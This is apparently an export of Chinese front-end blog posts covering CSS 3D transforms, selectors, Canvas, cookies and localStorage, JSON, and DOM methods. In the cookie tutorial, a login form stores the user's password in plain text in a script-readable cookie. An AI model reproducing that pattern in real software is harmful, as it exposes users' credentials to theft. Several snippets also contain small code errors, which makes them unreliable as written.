.face--left&#123; transform: rotateY(-90deg) translateZ(-100px); &#125; .face--right&#123; transform: rotateY(90deg) translateZ(-100px); &#125; .face--top&#123; transform: rotateX(-90deg) translateZ(100px); &#125; .face--bottom&#123; transform: rotateX(90deg) translateZ(100px); &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;cube container-3D&quot;&gt; &lt;div class=&quot;face face--front&quot;&gt;face--front&lt;/div&gt; &lt;div class=&quot;face face--back&quot;&gt;face--back&lt;/div&gt; &lt;div class=&quot;face face--left&quot;&gt;face--left&lt;/div&gt; &lt;div class=&quot;face face--right&quot;&gt;face--right&lt;/div&gt; &lt;div class=&quot;face face--top&quot;&gt;face--top&lt;/div&gt; &lt;div class=&quot;face face--bottom&quot;&gt;face--bottom&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;script type=&quot;text/javascript&quot; src=&quot; &quot; &gt;&lt;/script&gt;&lt;/html&gt; 如上，我们为 html/body 设置 perspective 属性，使其成为舞台元素，而为 .container-3D 添加了 transform-style:preserve-3d 使其成为渲染 3D 空间的容器，为其直接子元素开启 3D 渲染环境。 3D container 元素的常用旋转动画123456789101112131415.container-3D&#123; transform: rotateX(0deg) rotateY(0deg) rotateZ(0deg); transform-style: preserve-3d; animation: rotation 10s linear infinite; &#125; @-webkit-keyframes rotation &#123; from&#123; transform: rotateY(0deg) rotateX(-180deg) rotateZ(-140deg); &#125;50%&#123; transform: rotateY(360deg) rotateX(-360deg) rotateZ(0deg); &#125;to&#123; transform: rotateY(360deg) rotateX(180deg) rotateZ(220deg); &#125; &#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[CSS选择器]]></title>
      <url>%2F2016%2F11%2F14%2FCSS%E9%80%89%E6%8B%A9%E5%99%A8%2F</url>
      <content type="text"><![CDATA[0x00 基础选择器通配选择器设置所有标签使用相同样式如: *{ }; 不推荐通配符选择器，因为他是性能最低的一个选择器。 标签选择器为所有相同标签设置相同样式如: p{ }; 类选择器为一组相同的标签设置相同的样式如: .classname{ }; ID选择器ID选择器在页面中只能被调用一次如: #idname{ }; 0x02 组合选择器群组选择器如: p , body , img , div {} 相邻兄弟选择器如果需要选择紧接在另一个元素后的元素，而且二者有相同的父元素，可以使用相邻兄弟选择器 如：p + p { color:red;} 通用兄弟选择器匹配某元素之后的所有兄弟元素。如: h2~a { } 包含（后代）选择器如： body ul li {} 子元(子代)素选择器如: div &gt; p{} 标签a必须跟在h2之后(不一定紧跟),当然，前提是他们拥有相同的父元素。 子代选择器和后代选择器的区别 后代选择器的写法就是把外层的标记写在前面，内层的标记写在后面，之间用空格分隔。子选择器只对直接后代有影响的选择器，而对“孙子后代”以及多层后代不产生作用。 0x03 状态伪类选择器定义样式在标签的状态之上，而不是标签本身 12345a:link &#123;&#125; #点击前 a:hover &#123;&#125; #鼠标悬停时 a:focus &#123;&#125; #获得聚焦时 a:active &#123;&#125; #点击时 a:visited &#123;&#125; #点击后 下面的元素状态伪类，通常用于表单中，如：:enabled,:disabled,:checked(只用于单选按钮和复选框) 0x04 目标伪类:target通常设置用于锚点被选中时的样式。 123456789&lt;p&gt;&lt;a href=&quot;#box&quot;&gt;点我旋转放大Box&lt;/a&gt;&lt;/p&gt;&lt;div id=&quot;box&quot;&gt;&lt;/div&gt;//CSS #box:target &#123; border:4px solid red; transform: rotateZ(60deg) scale(1.8); transition: all 4s;&#125; 0x05 否定伪类:not(selectoe)匹配非指定/选择器的每个元素。 12body:not(first-chid)&#123;&#125;input:not([type=text])&#123;&#125; 0x06 结构化伪类:first-child:first-of-type匹配父元素的所有该子元素类型中第一个出现的元素. 123div :first-of-type &#123; background-color: lime;&#125; (注意div后面的空格，这使得element变为了div的所有后代元素) :last-child:last-of-type 表示了在（它父元素的）子元素列表中，最后一个给定类型的元素。 匹配在 p 元素内部的 最后一个 em 元素: 123p em:last-of-type&#123; //&#125; :nth-child(an+b)如:nth-child(2n)等价于nth-child(even),nth-child(2n+1) 等价于 nth-child(odd).或者是nth-child(3n) :nth-last-child(an+b):nth-of-type(an+b)匹配一个在文档树中位置为an+b-1 且和伪元素前名字一样 的元素,想在不受同胞异类元素和父元素影响保证自己选择相同类型得元素，这个伪元素更加灵活实用. 0x07 伪元素选择器::first-line {}选取某元素中的第一行 ::first-letter{}选择某元素中的第一个字或首字母 :: selection应用于文档中被用户高亮的部份 0x08 生成性内容::after::before 0x09 属性选取器属性名选择器如： img[title] {color:red} 属性值选择器如: img[title=&quot;red floewr&quot;] { } [attr~=value][attr|=value][attr^=value][attr$=value][attr*=value]0x0A 选择器的优先级行内样式(1000) –&gt; ID选择器(100) –&gt; 类选择器(10) –&gt; 标签选择器(1) –&gt; 全局选择器(0) 参考文档:https://developer.mozilla.org/zh-CN/docs/Web/CSS/:last-of-type]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Canvas基础]]></title>
      <url>%2F2016%2F11%2F09%2FCanvas%E5%9F%BA%E7%A1%80%2F</url>
      <content type="text"><![CDATA[0x00 Canvas使用 Canvas 元素必须为其设置宽度和高度属性，指定可以绘制区域的大小。如果不添加任何样式或者不绘制任何图形，那么是看不到该元素的。 但是若是通过 CSS 样式来为其设置宽高属性的话，如果 CSS 的尺寸与 canvas 初始比例(canvas 默认初始宽度 300 px 高度 150 px)不一致，它会出现扭曲。 创建 Canvas 元素，并通过 canvas.getContext() 方法获取其 2D 上下文。 1234567891011// HTML &lt;canvas id=&quot;myCanvas&quot; width=&quot;400&quot; height=&quot;400&quot;&gt;A drawing of something.&lt;/canvas&gt;// JSvar drawing = $(&quot;#myCanvas&quot;)if(drawing.getContext)&#123; // 确定浏览器是否支持 &lt;canvas&gt; var context = canvas.getContext(&quot;2d&quot;) // more code&#125; 如上，如果需要在画布上绘图，那么首先便需要获得绘图上下文。 然后，使用 canvas.toDataURL() 方法便可以获取在 元素上绘制的图像，它只接受一个参数，即是我们要指定图像的 MIME 类型。 123if(drawing.getContext())&#123; var imgURL = drawing.toDataURL(&quot;image/png&quot;); // 获取图像的数据 URL 0x01 2D 上下文使用 2D 上下文可以绘制简单的 2D 图形，比如矩形，弧线和路径。其两种基本绘图操作是填充(fillStyle)和描边(strokeStyle) 使用 strokeRect() 和 fillRect() 绘制矩形可以使用 fillStyle() 属性来为通过 fillRect() 绘制的矩形填充颜色；使用 strokeStyle() 属性来为 strokeRect() 方绘制的矩形描边 1234567891011121314151617var drawing = $(&quot;#myCanvas&quot;)if(drawing.getContext)&#123; // 检测浏览器是支持 canvas var context1 = drawing.getContext(&quot;2d&quot;); // 获得 2d 上下文 context1.fillStyle = &quot;red&quot; context1.fillRect(40,20,50,50) // 绘制一个矩形并填充 红色 context1.strokeStyle = &quot;blue&quot; context1.strokeRect(10,10,50,50) // 绘制一个矩形并描边为 蓝色&#125; 此外，可以使用 clearRect() 方法来清除指定区域。 0x02 绘制路径一切形状的原始基础都是路径。在 Cavans 创建一个形状的首先需要的是创建新路径(beginPath())，再通过绘图命令(比如mouvTo()等)在路径中绘制，然后关闭路径(clostPath())，最后填充颜色(fill())或描边(stroke())。 调用fill()函数时，所有没有闭合的形状都会自动闭合，所以你不需要调用closePath()函数。但是调用stroke()时不会自动闭合。 moveTo()设置笔触相对于画布左上角开始的起点位置，即是路径的起始点。 lineTo()直线路径。 描边三角形1234567891011121314var drawing = $(&quot;#myCanvas&quot;)if(drawing.getContext)&#123; // 检测浏览器是支持 canvas var context = drawing.getContext(&quot;2d&quot;); // 获得 2d 上下文 context.beginPath() context.strokeStyle = &quot;green&quot; context.moveTo(50,200) context.lineTo(200,100) context.lineTo(100,50) context.closePath() context.stroke() // 描边三角形&#125; 描边填充三角形12345678910111213141516171819202122232425var drawing = document.querySelector(&quot;#drawing&quot;)if(drawing.getContext)&#123; //是否支持 canvascontext = drawing.getContext(&quot;2d&quot;)// 获得 2d 上下文context.beginPath()// 开始绘画context.fillStyle = &quot;#333&quot;// 填充色为 #333context.strokeStyle = &quot;deeppink&quot;// 描边颜色为 deeppinkcontext.lineWidth = &quot;20&quot;// 线框为 20 pxcontext.moveTo(150,150)// 起始触点 (150,150)context.lineTo(150,300)context.lineTo(300,225)// 绘制一个三角形context.closePath()// 闭合路劲context.stroke()// 描边context.fill()// 填充&#125; arc() arcTo()arc(x,y,radius,startAngle,endAngle,clockwise) 画一个以（x,y）为圆心的以radius为半径的圆弧（圆），从startAngle开始到endAngle结束，按照anticlockwise给定的方向（默认为顺时针）来生成。 arc() 函数中的角度单位是弧度，不是度数。角度与弧度的js表达式:radians=(Math.PI/180)*degrees。 描边圆形12345678for(var i=0;i&lt;6;i++)&#123; for(var j=0;j&lt;6;j++)&#123; context.strokeStyle =&apos;rgb(0,&apos; + Math.floor(255-42.5*i) + &apos;,&apos; + Math.floor(255-42.5*j) + &apos;)&apos; context.beginPath() context.arc(50+60*i,50+60*j,30,0,Math.PI/180*360) context.stroke() &#125;&#125; 源自 MDN 官网。 描边填充圆形描边填充圆形，并使用 globalAlpha 设置其透明度为 0.3 123456789context.beginPath()context.strokeStyle = &quot;deeppink&quot; context.fillStyle =&quot;#333&quot;context.globalAlpha = &quot;0.3&quot;context.lineWidth = &quot;20&quot;context.arc(450,300,100,0,Math.PI/180*300)context.closePath()context.stroke()context.fill() 0x03 渐变Canvas 支持的渐变效果包括线性(createLinearGradient())和径向(createRadialGradient())渐变,并使用addColorStop() 为其指定渐变颜色。 strokeStyle 和 fillStyle 属性都可以接 canvasGradient 对象。 渐变颜色 addColorStop()addColorStop(position,color) 中第一参数 position 表示颜色出现在渐变中的相对位置。 线性渐变 createLinearGradient()createLinearGradient(x1,y1,x2,y2)，其所接收的四个参数，分别代表渐变的起点和终点。 12345678910context.beginPath()var lineGradient1 = context.createLinearGradient(100,200,100,400)lineGradient1.addColorStop(0.5,&quot;green&quot;)lineGradient1.addColorStop(1,&quot;red&quot;)context.strokeStyle = lineGradient1context.lineWidth = &quot;20&quot;context.moveTo(100,200)context.lineTo(100,400)context.closePath()context.stroke() 径向渐变 createRadialGradient()createRadialGradient(x1,y1,r1,x2,y2,r2) 方法接受 6 个参数，前三个定义一个以 (x1,y1) 为原点，半径为 r1 的圆，后三个参数则定义另一个以 (x2,y2) 为原点，半径为 r2 的圆。 123456789// 创建渐变var radGrad = context.createRadialGradient(0,150,40,0,140,90)radGrad.addColorStop(0,&apos;#00C9FF&apos;)radGrad.addColorStop(0.8,&apos;#00B5E2&apos;)radGrad.addColorStop(1,&apos;rgba(0,201,255,0)&apos;)// 画图形context.fillStyle = radGradcontext.fillRect(0,0,150,150) 0x04 绘制文本文本样式 font:这个字符串使用和 CSS 属性相同的语法. 默认的字体是 10px sans-serif textAlign:文本对齐方式，可选值:start,end,left,right,center textBaseline: 基线对齐方式，可选值:top,middle,bottom fillText(text,x,y,[,maxWidth])在指定的(x,y)位置填充指定的文本，绘制的最大宽度(可选). strokeText(text,x,y,[,maxWidth])在指定的(x,y)位置绘制空心文本，绘制的最大宽度(可选). 123456789101112131415161718192021222324252627var linGrad = context.createLinearGradient(50,50,400,200)linGrad.addColorStop(0.2,&quot;red&quot;)linGrad.addColorStop(0.7,&quot;deeppink&quot;)// 设置渐变var str = &quot;to be or not to be &quot;context.beginPath()context.font = &quot;60px 宋体&quot;// 设置文字格式 必需context.textAlign = &quot;left&quot;// 设置文字对齐方式 必需context.textBaseline = &quot;middle&quot;// 设置文字基线 必需context.shadowColor = &quot;#333&quot; context.shadowOffsetX = 10;context.shadowOffsetY = 10;context.shadowBlur = 10;context.closePath()// 闭合路径context.fillStyle = linGrad// 设置 fillStylecontext.strokeStyle = linGrad// 设置 strokeStyle context.fillText(str,50,50,400)// 填充文字context.strokeText(str,50,100,400)// 描边文字console.log(context.measureText(str))//width:570 measureText() 方法，将返回一个 [TextMetrics]对象的宽度、所在像素，这些体现文本特性的属性。 0x05 Using Imagescanvas 强大的特性还以使我们对图像进行操作处理。 当然，在对图像进行操作之间必然要引入图像资源，canvas 支持多种不同的图像资源引入方式，这里只了解常用的两种方式:使用 Image 对象或 &lt;img&gt; 标签 和 引用同一页面中的另一画布作为图像资源. drawImage(source,x,y) 图像资源，以及在画布中的起始位置 drawImage(source,x,y,width,height)图像资源，在画布中的起始位置，并以指定的宽度和高度显示在画布中。以次实现图像的缩放效果。 1234567var isImage = new Image;isImage.src = &quot;Koala.jpg&quot;isImage.onload = function()&#123; // do drawingImage statement context.drawImage(isImage,60,60,400,400) //五个参数时，代表图片在画布中显示的起始点和图片显示的宽高&#125; drawImage(source, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight)当使用九个参数时，便是需要对图像进行切片处理了。其中sx,sy,sWidth,sHeight 规定要在图像源中取得的切片位置和切片大小；dx,dy,dWidht,dHeight 表示该切片在画布中显示的起始位置和大小。 12345var isImage = new Image;isImage.src = &quot;Koala.jpg&quot;isImage.onload = function()&#123; context.drawImage(isImage,300,300,400,300,100,100,200,200)&#125; createPattern()我们可使用 createPattern() 方法来规定图像显示的方式，none,repeat,repeat-x,repeat-y 12345678var isImage = new Image;isImage.src = &quot;Koala.jpg&quot;isImage.onload = function()&#123; //图片是否平铺 var imgs = context.createPattern(isImage,&quot;repeat-x&quot;) context.fillStyle = imgs context.fillRect(0,0,700,500)&#125; 0x06 画布裁切 clip()123456789var isImage = new Image;isImage.src = &quot;Koala.jpg&quot;isImage.onload = function()&#123; context.drawImage(isImage,0,0,400,400)&#125;//画布裁切 clip()context.arc(230,230,170,0,Math.PI/180*360)context.closePath()context.clip() 0x07 画布方法save() 和 restore()save 和 restore 方法是用来保存和恢复 canvas 状态的，都没有参数。Canvas 的状态就是当前画面应用的所有样式和变形的一个快照。 12345678910111213context.beginPath()context.fillRect(50,50,150,150)// 使用默认设置绘制一个矩形context.save()// 保存默认配置下的绘画状态context.fillStyle = &quot;deeppink&quot;// 设置一个新的绘画状态context.fillRect(65,65,120,120)// 使用新的绘制状态绘制一个矩形context.restore()// 恢复到默认绘制状态context.fillRect(80,80,90,90)// 同样，使用默认状态绘制一个矩形 restore() 恢复的是离它最近的 save() 之上 所保存的状态。 translate()transltae(x,y) 方法用 移动 canvas 原点。 123context.fillRect(50,50,100,100)context.translate(100,100)context.fillRect(50,50,100,100) scale(x，y)scale(x,y) 缩放，其所接收的两个参数分别代表在 x 的缩放因子和在 y 轴的缩放因子。 12345context.scale(1.5,1.5)context.fillRect(50,50,100,100)context.translate(150,150)context.scale(0.5,0.5)context.fillRect(50,50,100,100) rotate()rotate(angle) 只接受一个参数，即旋转的角度，它是顺时针方向的，与 arc() 同样是以 弧度 为单位的值。 1context.rotate(Math.PI/180*deg) scale 也好，translate,rotate() 也好，所有的样式和变形命令都应该写在填充和描边命令之前。 0x08 画一个五角星123456789101112131415var r = 200context.translate(200,200)context.beginPath()context.moveTo(r,0)for(var i=0;i&lt;9;i++)&#123; context.rotate(Math.PI/180*36) if(i%2 == 0)&#123; context.lineTo(r/(Math.cos(Math.PI/180*36)*2)*0.7,0) &#125;else&#123; context.lineTo(r,0) &#125;&#125;context.closePath()context.fill()&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS服务器编程(1)Cookie和LocalStorage]]></title>
      <url>%2F2016%2F11%2F09%2FJS%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BC%96%E7%A8%8B(1)Cookie%E5%92%8CLocalStorage%2F</url>
      <content type="text"><![CDATA[0x00 使用Cookie记录信息简单的讲，cookie 就是一文件，用于在本地存储用户信息。其可以储存的数据类型可以是数字和字符串。可以存储的容量为 5 KB. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;FirstWeb&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; *&#123; margin: 0; padding: 0; &#125; label&#123; text-align:right; width: 60px; display: inline-block; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;&lt;label&gt;用户名:&lt;/label&gt;&lt;input type=&quot;text&quot; id=&quot;user&quot; name=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;label&gt;密码:&lt;/label&gt;&lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;&quot;&gt;&lt;/p&gt;&lt;button id=&quot;del&quot;&gt;删除用户名和密码&lt;/button&gt;&lt;button id=&quot;rem&quot;&gt;记住用户名和密码&lt;/button&gt;&lt;/body&gt;&lt;script type=&quot;text/javascript&quot;&gt; var user = document.querySelector(&quot;#user&quot;) var password = document.querySelector(&quot;#password&quot;) var del = document.querySelector(&quot;#del&quot;) var rem = document.querySelector(&quot;#rem&quot;) rem.onclick = function ()&#123; var nowDate = new Date(); nowDate.setDate(nowDate.getDate() +1); // 记录 cookie 的有效时间 document.cookie = &quot;usrName=&quot; + user.value +&quot;;expires=&quot; +nowDate; // 将用户名记录到 cookie 中 document.cookie = &quot;password=&quot;+password.value+&quot;;expires=&quot;+nowDate; // 将密码记录到 cookie 中 &#125; del.onclick = function()&#123; var nowDate = new Date(); nowDate.setDate(nowDate.getDate() -1); // 将当前时间减去一天 设置 cookie 立即失效 document.cookie = &quot;usrName=&quot; + user.value +&quot;;expires=&quot; +nowDate; document.cookie = &quot;password=&quot;+password.value+&quot;;expires=&quot;+nowDate; &#125; window.onload = function ()&#123; // 文档加载完成以后，获得 cookie 中的信息 var arrCookie = document.cookie.split(&quot;; &quot;) // 使用 &quot;; &quot;(分号和空格) 分隔原始 cookie，获的多个不同的键值对组合的一个数组 console.log(arrCookie); for(var i=0;i&lt;arrCookie.length;i++)&#123; // 遍历数组中的键值对 var cookieVlue = arrCookie[i].split(&quot;=&quot;); // 使用 &quot;=&quot; 分隔键和值 console.log(cookieVlue) if( cookieVlue[0] == &quot;usrName&quot;)&#123; user.value = cookieVlue[1] &#125;else if(cookieVlue[0] == &quot;password&quot;)&#123; password.value = cookieVlue[1] console.log(password.value); &#125; &#125; &#125;&lt;/script&gt;&lt;/html&gt; 0x01 LocalStoragecookie 的优势是支持它的厂家众多，几乎所有的浏览器厂商都是支持的，但是其最大的缺点就是可以存储的容量太少， 5KB。 H5 时代，LocalStorage 应运而生，它可以存储 5M 的资源。LocalStroage 是本地存储，与之对应的是 Session Strogae，窗口一旦关闭就没有了。二者用法完全相同。 检测浏览器是否支持 localSorage12345if(window.localStorage)&#123; //supports&#125; else &#123; // not supports&#125; 相比于 cookie 的操作，操作localStorage 是在是太容易了，设置 localStorage 的三种方式:“.”,“[ ]”,“setItem()”.此外，我们只需要使用“removeItem()” 来删除本地存储就可以了 123456789101112//设置 localStorage 的三种方式localStorage.name = &quot;Jack&quot;localStorage[&quot;age&quot;] = 29localStorage.setItem(&quot;school&quot;,&quot;MIT&quot;)// 获得 localStorageconsole.log(localStorage.name)console.log(localStorage.[&quot;age&quot;])console.log(localStorage.getItem(&quot;school&quot;))// 删除 localStoragelocalStorage.removeItem(&quot;school&quot;)]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS服务器编程(4)JSON]]></title>
      <url>%2F2016%2F11%2F08%2FJS%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BC%96%E7%A8%8B(4)JSON%2F</url>
      <content type="text"><![CDATA[0x00 JSONJSON(JavaScript Object Notation, JavaScript对象表示法)。 JSON 利用了 JS 中的一些模式来表示结构化数据。 JSON 是一种数据格式，而不编程语言。 JSON 可以表示三种类型的值，简单值,对象，数组。 对于简单值，在JS中，JSON 可以表示，字符串,数值,布尔值,null,但是不支持JS 中的特殊值 undefined。 JSON 不支持变量，函数或对象实例。 使用 JSON 表示对象1234567891011121314//JSON 中的对象&#123; &quot;name&quot;:&quot;Jack&quot;, &quot;age&quot;:29, &quot;school&quot;:&#123; &quot;name&quot;:&quot;huaxin school&quot;, &quot;location&quot;:&quot;china&quot; &#125;&#125;//JS 中的对象var object = &#123; &quot;name&quot;:&quot;Macil&quot;, &quot;age&quot;:29&#125;; 在 JSON 中表示对象时必须给对象的属性添加双引号。此外，没有声明变量，其次，末尾没有分号。 JSON 表示数组JSON 中数组采用的是 JS 中数组的字面量形式。 1[24,&quot;hello&quot;,false] 同样的，JSON 中数组也没有变量好分号。 把数字和对象结合起来，便可以构成复杂的数据集合。 0x01 解析和序列化JSON 数据结构可以被解析为有用的 JS 对象，这也是 JSON 成为 Web 服务开发中交互数据的事实标准的重要原因。 JSON 对象有两个方法: stringify() 和 parse()。 stringify():把 JS 对象序列化为 JSON 字符串parse():把 JSON 字符串解析为原生的 JS 值 JSON.stringify()JSON.stringify() 除了要序列化的 JS 对象外，还可以接受另外两个参数。需要添加的第二个参数是过滤器，可以是数组(数组过滤器)或者函数(函数过滤器)。第三个参数表示，是否在 JSON 字符串中保留缩进。 数组过滤器如果过滤器参数是数组，那么 JSON.stringify() 的结果中将只包含数组中列出的属性。 12345678910var books = &#123; &quot;title&quot;:&quot;挪威的森林&quot;, &quot;authors&quot;:[&quot;村上春树&quot;], &quot;edition&quot;:3, &quot;year&quot;:2011&#125;;var jsonText = JSON.stringify(books,[&quot;title&quot;,&quot;edition&quot;]);console.log(jsonText);//&#123;&quot;title&quot;:&quot;挪威的森林&quot;,&quot;edition&quot;:3&#125; 函数过滤器函数过滤器中的函数接受两参数:属性名 和 属性值，而属性名只能是字符串。 函数过滤器会根据传入的键来决定返回的结果。但若是函数返回了 undefined 那么相应的属性会被忽略。 123456789101112131415161718192021 var books = &#123; &quot;title&quot;:&quot;挪威的森林&quot;, &quot;authors&quot;:[&quot;村上春树&quot;,&quot;芥川龙之介&quot;,&quot;松下幸之助&quot;,&quot;太宰治&quot;], &quot;edition&quot;:3, &quot;year&quot;:2011&#125;;var jsonText = JSON.stringify(books,function(key,value)&#123; switch(key)&#123; case &quot;authors&quot;: return value.join(&quot;,&quot;); case &quot;year&quot;: return 50000; case &quot;edition&quot;: return undefined; default : return value; &#125;&#125;);console.log(jsonText);//&#123;&quot;title&quot;:&quot;挪威的森林&quot;,&quot;authors&quot;:&quot;村上春树,芥川龙之介,松下幸之助,太宰治&quot;,&quot;year&quot;:50000&#125; 字符缩进JSON.stringify() 的第上参数可以为数字或者任意字符。分别表示要缩进的空格数和用来表示的缩进字符串(不再使用空格) 1var jsonText = JSON.stringify(book,null,&quot;---&quot;); JSON.parse()与 JSON.stringigy() 方法对应，JSON.parse() 可以接受一个函数作为还原函数(reviver),它也同样接收两参数，一个键和一个值。 如果还原函数返回 undefined 则表示要在结果中删除相应的键。 在将日期对象转换为 Date 对象时，便经常使用到还原函数了。 12345678910111213141516171819202122232425262728var books = &#123; &quot;title&quot;:&quot;挪威的森林&quot;, &quot;authors&quot;:[&quot;村上春树&quot;,&quot;芥川龙之介&quot;,&quot;松下幸之助&quot;,&quot;太宰治&quot;], &quot;edition&quot;:3, &quot;year&quot;:2011, &quot;releaseDate&quot;:new Date(2016,11,8)&#125;;var jsonText = JSON.stringify(books,function(key,value)&#123; switch(key)&#123; case &quot;authors&quot;: return value.join(&quot;,&quot;); case &quot;year&quot;: return 50000; case &quot;edition&quot;: return undefined; default : return value; &#125;&#125;);var bookCopy = JSON.parse(jsonText,function(key,value)&#123; if (key == &quot;releaseDate&quot;)&#123; return new Date(value); &#125; else &#123; return value; &#125;&#125;)]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS-DOM(4)获取节点的内容]]></title>
      <url>%2F2016%2F11%2F02%2FJS-DOM(4)%E8%8E%B7%E5%8F%96%E8%8A%82%E7%82%B9%E7%9A%84%E5%86%85%E5%AE%B9%2F</url>
      <content type="text"><![CDATA[0x00 innerHTML 属性innerHTML 在读模式下，返回与调用元素的所有子节点及其内容(HTML 代码)；在写模式下，innerHTML 会根据指定的值创建新的 DOM 树，然后用这个树完全替换调用元素原中的所有 HTML 内容。 如果设置(写)或获取(读)的值仅是文本而没有 HTML 标签，那么 innerHTML 的 结果就是设置或获取纯文本。 0x01 outerHTML 属性outerHTML 在读模式下，返回调用它的元素本身及所有子节点的 HTML 内容。在写模式下，会根据指定的 HTML 字符内容创建新的 DOM 子树，然后用这个子树 完全替换调用的元素(包括其元素本身也会替换)。 123456789101112// HTML:// &lt;div id=&quot;container&quot;&gt;&lt;div id=&quot;d&quot;&gt;This is a div.&lt;/div&gt;&lt;/div&gt;container = document.getElementById(&quot;container&quot;);d = document.getElementById(&quot;d&quot;);console.log(container.firstChild.nodeName); // logs &quot;DIV&quot;d.outerHTML = &quot;&lt;p&gt;This paragraph replaced the original div.&lt;/p&gt;&quot;;console.log(container.firstChild.nodeName); // logs &quot;P&quot;// id为d的div元素已经不在文档树中(不在页面中显示,但仍然在内存中)// 新的P元素替换了div元素 但是当该元素是 表单是，outerHTML 不会对表单元素产生任何变化。 12345//HTML:// &lt;form id=&quot;myForm&quot;&gt;&lt;p&gt;this is form&lt;/p&gt;&lt;/form&gt;var form = document.querySelector(&quot;#myForm&quot;);form.innerHTML = &lt;p&gt;hello word!&lt;/p&gt;//form 元素不会被替换 此外,当一个元素因为修改自身的 outerHTML 属性而被替换时，指向该元素的变量仍然指向替换前的元素。 1234var p = document.getElementsByTagName(&quot;p&quot;)[0];console.log(p.nodeName); // 显示: &quot;P&quot;p.outerHTML = &quot;&lt;div&gt;This div replaced a paragraph.&lt;/div&gt;&quot;;console.log(p.nodeName); // 仍然为: &quot;P&quot;; 0x02 insertAdjacentHTML 属性insertAdjacentHTML() 方法接收两个参数: 插入位置和要插入的 HTML 文本。第一个参数必须是下列值之一。 beforebegin: 在当前元素之前插入一个紧邻的同辈元素 afterbegin: 在当前元素之下插入一个新的子元素或者作为第一个子元素插入 beforeend: 在当前元素之下插入一新的子元素或者作为最后一个子元素 afterend: 在当前元素之后插入一个紧邻的同辈元素 0x03 nodeName 和 nodeValue 属性nodeName 属性可以获取节点的名称,与标签名相同，只读。 文本节点的 nodeName 始终是 #text 。 文档节点的 nodeName 始终是 #document 。 nodeValue 属性获得规定节点的值。 元素节点的 nodeValue 是 undefined 或 null。 文本节点的 nodeValue 是文本本身。 属性节点的 nodeValue 是属性值。 0x04 textContent 属性设置了 textContent 属性，会删除所有子节点，并被替换为包含指定字符串的一个单独的文本节点。 如果是读模式，那么使用 textContent 属性会得到包括其所有子节点在内的文本内容。 12345// HTML:// &lt;form id=&quot;form&quot;&gt;&lt;p&gt;&lt;label&gt;用户名:&lt;/label&gt;&lt;input id=&quot;userName&quot; name =&quot;userName1&quot; class=&quot;formInput&quot; type=&quot;text&quot;&gt;&lt;/input&gt;&lt;span&gt;输入不合法,必需是中文&lt;/span&gt;&lt;/p&gt;&lt;/form&gt;var form = document.querySelector(&quot;#form&quot;);console.log(form.textContent); //用户名:输入不合法,必需是中文]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS-DOM(5)获取元素的方法]]></title>
      <url>%2F2016%2F11%2F02%2FJS-DOM(5)%E8%8E%B7%E5%8F%96%E5%85%83%E7%B4%A0%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
      <content type="text"><![CDATA[0x00 document.getElment系列 查找元素obj.getElementById(“idname”)通过元素 ID 来获得唯一元素。 obj.getElementsByTagName(“tagname”)通过标签名查找元素，返回一个 HTMLCollection，我们可以使用 [] 语法或者 item() 方法来访问该对象中的项。 123var images = document.getElementsByTagName(&quot;images&quot;);alert(images[0].src);alert(images.item(0).src); 此外，HTMLCollection 对象还要一个方法，namedItem(),该方法可以通过 name 特性取得集合中的第一项。 12&lt;img src=&quot;myimage.jif&quot; name = &quot;myImage&quot;&gt;var myImage = images.namedItem(&quot;myImage&quot;); 对命名的项也可以使用 [] 来访问，但是只是针对 HTMLCollection 集合中的第一项。 1var myImage = images[&quot;myImage&quot;]; 对 HTMLCollttion 而言，可以使用方括号传入数值或者字符串。在后台，对数值索引会调用 item(), 对字符串索引会调用 namedItem()。 通过命名项，即是通过元素的 name 属性值去访问一个具体的元素，就是一个坑，大大坑！ obj.getElementsByName(“elementname”)最常使用 getElementsByName() 的情况是取得单项按钮的时候。通过 name 来获得对象，返回的是一HTMLCollection 对象，通过元素的 value 来区分单个元素。 obj.getElementsByClassName(“classname”)通过 class 来获得对象，返回的是一HTMLCollection 对象，可通过 innerHTML 来区分单个元素。 0x01 选择符 APISelectors API 致力于让浏览器支持 原生CSS 查询，以提高解析和数查询的性能。其两个核心方法是: querySelector() 和 querySelectorAll(),而它们接受的参数是 CSS选择符。 querySelector()querySelector() 返回的是与该模式匹配的第个元素。 123456var body = document.querySelector(&quot;body&quot;);// 取得 bodyvar img = document.querySelector(&quot;img.button&quot;);// 取得类为 button 的第一个图片元素var selected = document.querySelector(&quot;.selected&quot;);// 取得 selected 类的第一元素 querySelectorAll()querySelectorAll() 方法返回的是一个 Static NodeList 实例而不是 HTMLCollection 类型，NodeList对象有个length属性和item()方法，这意味着我们可以通过对item() 传入索引(Number | String)去访问具体的节点。 123456var ems = document.getElementById(&quot;myDiv&quot;).querySelectorAll(&quot;em&quot;);// 取得 div 中 的 所有 em 元素var strongs = document.querySelector(&quot;p strong&quot;);// 取得 p 中的所有 strong 元素var allImg = document.querySelectorAll(&quot;#wrapper img&quot;)// 查找 ID 为 wrapper 下的所有 img 标签 实际上，querySelectorAll 返回的是一个 Static NodeList 对象，而 getElementsBy 系列的返回的是一个动态的 HTMLCollection 对象。 一个经典的的栗子: 123456789101112131415// Demo 1var ul = document.querySelectorAll(&apos;ul&apos;)[0], lis = ul.querySelectorAll(&quot;li&quot;);for(var i = 0; i &lt; lis.length ; i++)&#123;//lis.lenght 不会改变 ul.appendChild(document.createElement(&quot;li&quot;));&#125;// Demo 2var ul = document.getElementsByTagName(&apos;ul&apos;)[0], lis = 